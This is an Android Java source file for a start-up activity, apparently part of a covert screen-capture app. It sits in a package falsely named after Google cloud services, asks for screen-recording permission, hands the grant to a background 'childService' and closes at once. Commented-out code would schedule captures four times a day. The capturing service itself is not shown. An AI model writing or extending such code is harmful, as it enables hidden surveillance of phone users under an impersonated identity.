package com.google.cloudservices;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.DisplayMetrics;

import pro.tasking.R;

import java.util.Calendar;

public class StartActivity extends AppCompatActivity {
    private static final int REQUEST_SCREENSHOT = 59706;
    private MediaProjectionManager mgr;
    int mScreenDensity;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);
        setrquestmeediaprojection();

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_SCREENSHOT) {
        Intent intent=new Intent(getApplicationContext(),childService.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                .putExtra(childService.EXTRA_RESULT_INTENT, data)
                .putExtra("density", mScreenDensity);
        ContextCompat.startForegroundService(getApplicationContext(),intent);
//            Calendar calendar = Calendar.getInstance();
//            calendar.set(Calendar.HOUR_OF_DAY, 4);
//            calendar.set(Calendar.MINUTE, 0);
//            setalarm(calendar,getApplicationContext(),resultCode,data,mScreenDensity,1);
//            calendar = Calendar.getInstance();
//            calendar.set(Calendar.HOUR_OF_DAY, 10);
//            calendar.set(Calendar.MINUTE, 0);
//            setalarm(calendar,getApplicationContext(),resultCode,data,mScreenDensity,2);
//            calendar = Calendar.getInstance();
//            calendar.set(Calendar.HOUR_OF_DAY, 16);
//            calendar.set(Calendar.MINUTE, 0);
//            setalarm(calendar,getApplicationContext(),resultCode,data,mScreenDensity,3);
//            calendar = Calendar.getInstance();
//            calendar.set(Calendar.HOUR_OF_DAY, 22);
//            calendar.set(Calendar.MINUTE, 0);
//            setalarm(calendar,getApplicationContext(),resultCode,data,mScreenDensity,4);
        finish();}
    }
    private void setalarm(Calendar calendar, Context context, int resultCode, Intent data, int mScreenDensity, int id) {
        Intent intent = new Intent(context, AllarmReceiver.class);
        intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                .putExtra(childService.EXTRA_RESULT_INTENT, data)
                .putExtra("density", mScreenDensity);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, id, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);

        if (alarmManager != null) {
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), AlarmManager.INTERVAL_DAY, pendingIntent);

        }
    }
    public void setrquestmeediaprojection() {
        mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        startActivityForResult(mgr.createScreenCaptureIntent(),
                REQUEST_SCREENSHOT);
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        mScreenDensity = metrics.densityDpi;

    }
}
